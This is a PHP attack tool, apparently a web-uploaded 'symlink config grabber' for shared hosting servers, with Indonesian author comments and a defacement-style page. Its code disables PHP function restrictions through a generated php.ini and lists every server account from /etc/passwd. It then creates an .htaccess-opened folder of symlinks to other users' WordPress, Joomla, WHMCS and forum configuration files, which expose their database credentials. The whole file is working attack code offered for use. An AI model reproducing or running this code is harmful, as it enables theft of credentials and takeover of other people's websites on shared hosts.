<?php
//            Coded By Pace Usa 
//                Jatim Melawan Dunia 
//    Diganti Mas Copyright nya biar master :)
// WHM Nyangkut Semua Asal Udah Sange Berat :)
$head = '
<html>
<head>
</script>
<title>7awa Timur</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #66FF00;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #66FF00;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #66FF00;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border : solid 3px ;
border-color : #333;
BACKGROUND-COLOR: white;
font: 11pt Verdana;
color: #333;
}
select {
BORDER-RIGHT:#66FF00 1px solid;
BORDER-TOP: #66FF00 1px solid;
BORDER-LEFT: #66FF00 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER: buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border : dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin : -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
COLOR: White; TEXT-DECORATION: none
}
A:visited {
COLOR: White; TEXT-DECORATION: none
}
A:hover {
color: Red; TEXT-DECORATION: none
}
A:active {
color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
document.getElementById(id).style.display = \'none\';
document.cookie=id+\'=0;\';
}
function show_div(id)
{
document.getElementById(id).style.display = \'block\';
document.cookie=id+\'=1;\';
}
function change_divst(id)
{
if (document.getElementById(id).style.display == \'none\')
show_div(id);
else
hide_div(id);
}
</script>'; ?>
<html>
<head>
<?php
echo $head ;
echo '
<center><img src="http://58.65.166.43/photoes/hh.png" height="400" width="500"></center>

';

?>
<body bgcolor=black><h3 style="text-align:center"><font color=red size=2 face="comic sans ms">
<form method=post>
<input type=submit name=ini value="Generate PHP.ini" /></form>
<?php
if(isset($_POST['ini']))
{

$r=fopen('php.ini','w');
$rr=" disable_functions=none ";
fwrite($r,$rr);
$link="<a href=php.ini><font color=white size=2 face=\"comic sans ms\"><u>-> PHP.INI <-</u></font></a>";
echo $link;

}
?>
<p>Klik Generate php.ini -> Buka di new tab
<?php
?>
<form method=post>
<input type=submit name="usre" value="Grab User" /></form>

<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=20 cols=40 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br><br>
<input type=submit name=su value="Hajar Bos" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=2 face=\"comic sans ms\">";
if(isset($_POST['su']))
{

$dir=mkdir('X-7atim',0777);
$r = " Options all \n DirectoryIndex 7atim.html \n Require None \n Satisfy Any";
$f = fopen('X-7atim/.htaccess','w');

fwrite($f,$r);
$consym="<a href=X-7atim/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
echo "<br>folder where config files has been symlinked<br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";

$usr=explode("\n",$_POST['user']);

foreach($usr as $uss )
{
$us=trim($uss);

$r="X-7atim/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home1/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home1/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home1/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home1/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home1/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home1/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home1/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home1/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home1/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home1/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home1/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home1/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home1/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home1/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home1/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home1/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home1/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home1/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home1/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home1/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home1/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home1/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home1/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home1/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home1/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home2/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home2/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home2/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home2/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home2/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home2/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home2/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home2/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home2/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home2/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home2/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home2/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home2/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home2/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home2/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home2/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home2/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home2/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home2/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home2/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home2/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home2/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home2/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home2/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home2/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home3/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home3/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home3/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home3/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home3/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home3/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home3/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home3/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home3/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home3/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home3/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home3/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home3/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home3/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home3/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home3/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home3/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home3/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home3/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home3/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home3/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home3/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home3/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home3/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home3/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home3/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home4/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home4/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home4/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home4/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home4/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home4/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home4/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home4/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home4/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home4/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home4/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home4/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home4/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home4/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home4/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home4/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home4/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home4/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home4/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home4/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home4/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home4/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home4/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home4/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home4/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home5/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home5/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home5/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home5/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home5/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home5/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home5/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home5/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home5/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home5/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home5/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home5/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home5/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home5/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home5/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home5/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home5/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home5/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home5/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home5/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home5/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home5/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home5/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home5/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home5/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
}
}
?>
